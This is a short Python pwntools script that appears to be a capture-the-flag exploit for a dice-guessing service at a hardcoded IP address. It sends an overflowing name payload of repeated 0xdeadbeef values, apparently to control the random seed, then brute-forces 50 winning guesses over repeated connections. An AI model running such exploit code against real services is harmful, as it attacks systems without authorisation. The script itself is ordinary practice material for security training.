from pwn import *
import random
import time 
#b *0x555555554b09 iwin
def tr(ans):
	#sleep(0.5)
	p=remote("47.96.239.28",9999)
	p.readuntil("name:")
	#context.log_level="debug"
	p.sendline(p64(0xdeadbeefdeadbeef)*8+p64(0))
	i=0
	len_now=len(ans);
	log.success(ans)
	if True:
		while i < len_now:
			p.readuntil("nt(1~6): ")
			next=ans[i]
			i+=1
			p.sendline(next)
		random.seed(time.time())
		next=str(int(random.randint(1,6)));
		p.readuntil("nt(1~6): ")
		p.sendline(next)
		print next
		sub=p.readuntil('.')
		log.info(sub)
		return sub,next

def main():
	ans="25"
	while(1):
		if len(ans)==50:
			print ans			
			break
		re,n=tr(ans)
		if "win" in re :
			ans+=n
		else :
			continue
main()
